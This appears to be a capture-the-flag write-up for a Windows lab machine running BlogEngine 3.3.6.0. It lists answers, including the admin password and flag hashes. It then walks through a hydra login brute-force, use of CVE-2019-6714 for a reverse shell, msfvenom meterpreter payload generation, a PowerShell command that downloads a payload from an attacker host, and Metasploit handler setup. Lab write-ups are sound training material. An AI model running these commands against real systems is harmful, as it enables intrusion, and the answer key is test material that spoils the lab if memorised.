# Questions

1. Whats the name of the clown displayed on the homepage?
	1. pennywise
2. What request type is the Windows website login form using?
	1. POST
3. What is the password for the admin account?
	1. 1qaz2wsx
4. What version of BlogEngine is the website running on?
	5. 3.3.6.0 
5. What CVE is that version vulnerable to?
	1. CVE-2019-6714
6. Who is the webserver running as?
	1. iis apppool\blog
7. What is the OS version of this windows machine?
8. What is the name of the abnormal _service_ running?
	1. WindowsScheduler
9. What is the name of the binary you're supposed to exploit?
	1. message.exe
10. What is the user flag (on Jeffs Desktop)?
	1. 759bd8af507517bcfaede78a21a73e39
11. What is the root flag?
	1. 7e13d97f05f7ceb9881a3eb3d78d3e72
12. Using winPeas, what was the Original Install time?
	1. 8/3/2019, 10:43:23 AM

# Write up

Navigating to the webpage, we can see that there's a login. Attempting to login with default credentials gives an error, but we can attempt to bruteforce a password with the default admin username. Intercept a request using burpsuit and harvest the view information sent along with the request for use with hydra.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-form-post://10.10.156.117:80/Account/login.aspx:_VIEWSTATE=KfDgAk7gvf5BBbU9vws2LlpYYAdyi1V1gQbFdmzLk2i6W2uyuLU%2FYlnMlHoE69k3Dx819Q2aM7tjXtaelAPpi%2BHJ7Xztv%2BuVoifIqFaKaHTixwdMYMhppeVasH4PdfQKBM2ShIJTghSWTIi%2Biu8k6FmuLeDZOXCMtz48xlx0a1FaeIPcdgPtvkw26FTDSuzKeHfoW1QUsFuu1T3UtvDJANDv1t4wiiGt2em5hEEw0dKqeMaKfMUhUvQJmoDNao87vpV%2BG4wNE1y4V7eOfG2jqZ0GSaOS4FGbyNYs6WVTK61Dp305HrvhIAmZUfdQn7tyy117yjhhV3WxghNNmkMbgkfGf%2FIuJ0qdQG8Dp5DOcRgw4wOF&_EVENTVALIDATE=T%2FbcUIAq%2B5F4Oo6mmxQ6WP2fRU05U%2BKdM3Rk7jwAARr3NQ0OQ%2BEAdfcCS0AVBQWnAwnCrpSAhi%2BxL29L4fClQtErCKWo6WVWbJm0FV7%2BNKazmDKYP%2FUYrI7jlp0SMVRx4mQs%2Fu2urep2yMwWSUpAeutP7sWE1x%2Bp9FwvvhA%2FD8GTrk64&ctl00%5C%24MainContent%5C%24LoginUser%5C%24UserName=^USER^&ctl00%5C%24MainContent%5C%24LoginUser%5C%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
`

Running the above command gives the password for the admin account. Once we're logged in we can see that the version of BlogEngine is 3.3.6.0 which has the vulnerability CVE-2019-6714. 

Downloading the script from exploitdb and modifying it for our attacker machine, we can then upload it to the blog with the name PostView.ascx then access http://TARGET_IP/?theme=../../App_Data/files while a nc listener is running on our machine to gain a reverse shell.

Now that we have a reverse shell, we can generate a payload using msfvenom and upload that to the target using an http server.

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5000 -f exe -o reverse.exe
python3 -m http.server 9000
```
```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://ATTACKER-IP:ATTACKER-HTTP-PORT/reverse.exe','reverse.exe')"
```

Once we have the payload on the target machine, we can start [[metasploit]] and the multi handler exploit module. Once it's running we execute the payload on the target machine to gain a meterpreter shell.

``` bash
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST tun0 
set LPORT 5000
run
```

